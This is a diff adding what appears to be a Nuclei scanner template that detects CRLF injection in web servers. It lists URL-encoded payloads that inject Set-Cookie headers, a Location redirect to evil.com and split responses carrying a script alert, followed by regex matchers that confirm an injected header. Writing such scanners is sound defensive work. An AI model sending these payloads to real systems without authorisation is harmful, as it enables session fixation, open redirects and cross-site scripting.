@@ -1,0 +1,53 @@
+id: crlf-injection-extended
+
+info:
+  name: CRLF Injection Extended Detection
+  author: J4D3s-Gs-z14-0
+  severity: high
+  description: Detects genuine CRLF injection vectors by verifying standalone injected headers.
+  reference:
+    - https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a
+  tags: crlf, header-injection, response-splitting, xss, dast
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%%0a0aSet-Cookie:coffin=hi"
+      - "{{BaseURL}}/%0aSet-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%0aSet-Cookie:coffin=hi"
+      - "{{BaseURL}}/%0d%0aLocation:%20http://evil.com"
+      - "{{BaseURL}}/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23"
+      - "{{BaseURL}}/%0d%0a%0d%0a<script>alert('XSS')</script>;"
+      - "{{BaseURL}}/%0d%0aContent-Type:%20text/html%0d%0aHTTP/1.1%20200%20OK%0d%0a%0d%0a<script>alert('XSS');</script>"
+      - "{{BaseURL}}/%0d%0aSet-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%23%0aSet-Cookie:coffin=hi"
+      - "{{BaseURL}}/%25%30%61Set-Cookie:coffin=hi"
+      - "{{BaseURL}}/%2e%2e%2f%0d%0aSet-Cookie:coffin=hi"
+      - "{{BaseURL}}/%3f%0d%0aLocation:%0d%0acoffin-x:coffin-x%0d%0aContent-Type:text/html"
+      - "{{BaseURL}}/%5Cr%20Set-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%5Cr%5Cn%20Set-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%E5%98%8A%E5%98%8D%0D%0ASet-Cookie:coffin=hi;"
+      - "{{BaseURL}}/%E5%98%8D%E5%98%8ASet-Cookie:coffin=hi"
+      - "{{BaseURL}}/%u000ASet-Cookie:coffin=hi;"
+      - "{{BaseURL}}/www.evil.com/%2E%2E%2F%0D%0ASet-Cookie:coffin=hi;"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      # Matcher Positivo: Valida se o cabeçalho injetado nasce NO INÍCIO de uma nova linha
+      - type: regex
+        part: header
+        condition: or
+        regex:
+          - "(?m)^[S|s]et-[C|c]ookie\\s*:\\s*coffin\\s*=\\s*hi"
+          - "(?m)^coffin-x\\s*:\\s*coffin-x"
+          - "(?m)^[L|l]ocation\\s*:\\s*(http[s]?:)?//www\\.evil\\.com"
+
+      # Matcher Negativo: Cancela o match se o Set-Cookie/coffin-x estiver preso dentro da linha do Location
+      - type: regex
+        part: header
+        negative: true
+        regex:
+          - "(?i)Location:.*Set-Cookie"
+          - "(?i)Location:.*coffin-x"
